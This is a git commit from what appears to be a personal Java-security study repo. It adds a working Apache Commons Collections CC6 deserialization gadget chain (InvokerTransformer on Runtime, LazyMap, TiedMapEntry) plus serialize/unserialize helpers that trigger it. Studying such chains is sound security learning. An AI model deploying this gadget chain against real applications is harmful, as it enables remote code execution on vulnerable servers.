bf357274090f4062a417c3f5f1f63fb222348330
dr0se-mirror <2721808339@qq.com>
2024-12-08 15:15:40 +0800

    cc6分析完成

--- CC1/src/main/java/com/drose/CC6/cc6.java
+++ CC1/src/main/java/com/drose/CC6/cc6.java
@@ -4,13 +4,16 @@ import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
+import java.io.*;
+import java.lang.reflect.Field;
 import java.util.HashMap;
 import java.util.Map;
 
 public class cc6 {
-    public static void main(String[] args) {
+    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, NoSuchFieldException {
         Transformer[] transformers = new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
@@ -21,9 +24,31 @@ public class cc6 {
         ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
 
         HashMap hashMap = new HashMap();
-        Map lazymap = LazyMap.decorate(hashMap, chainedTransformer);
-        lazymap.get("Dr0se");
+//        Map lazymap = LazyMap.decorate(hashMap, chainedTransformer);
+        Map lazymap = LazyMap.decorate(hashMap, new ConstantTransformer(1));
+//        lazymap.get("Dr0se");
         //需要继续分析哪里有get()函数的调用。
+        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazymap,"1");
+//        tiedMapEntry.hashCode();
+        HashMap<Object,Object> hashMap2 = new HashMap();
+        hashMap2.put(tiedMapEntry,"Dr0se");
 
+        Class<LazyMap> lazyMapClass = LazyMap.class;
+        Field factoryField = lazyMapClass.getDeclaredField("factory");
+        factoryField.setAccessible(true);
+        factoryField.set(lazymap,chainedTransformer);
+        lazymap.remove("1");
+        serialize(hashMap2);
+        unserialize("test.txt");
+    }
+    //序列化反序列化
+    public static void serialize(Object obj) throws IOException, FileNotFoundException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("./test.txt"));
+        oos.writeObject(obj);
+    }
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
     }
 }
--- README.md
+++ README.md
@@ -1,12 +1,11 @@
 # Dr0se sec-learning
 我个人的学习记录，如果喜欢可以点颗星，互勉！！！（持续更新）
 # Java安全
-目前进度，cc1复现学习已经完成，后面继续补充其他的内容
-（2024/11/19骑车摔骨折，做手术去了，间隔了一段时间没有更新）
+目前进度，CC1、CC1lazyMap、CC6更新完毕。
 
 https://kdocs.cn/l/cilx7kewJnkw
 
 # 大模型安全
-入门，看看一些文献进行探索
+入门，看看一些文献进行探索。
 
 https://kdocs.cn/l/cojP7kR6SE86
